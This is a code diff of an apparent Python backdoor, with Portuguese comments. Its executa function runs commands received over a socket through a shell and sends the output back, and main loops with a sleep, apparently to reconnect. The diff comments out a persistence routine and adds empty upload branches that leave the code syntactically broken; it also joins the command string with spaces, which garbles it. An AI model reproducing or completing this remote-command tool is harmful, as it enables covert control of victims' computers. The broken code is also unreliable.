@@ -45,13 +45,12 @@ def executa(socket):
                 return
             else:
                 try:
-                    dados = dados.split(' ')
-                    if(dados[0]=='cd'):
-                        dados.remove('cd')
-                        dados = ' '.join(dados)
-                        os.chdir(dados)
-                        print(os.listdir(os.getcwd()))
+                    if(dados=='1'): # upload
+
+                    elif(dados=='2'):
+
                     else:
+                        dados = ' '.join(dados)
                         comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                         retorno = comando.stdout.read() + comando.stderr.read()
                         socket.send(retorno)
@@ -71,5 +70,5 @@ def main():
             time.sleep(5)
 
 if __name__=='__main__':
-    persistencia()
+    #persistencia()
     main()
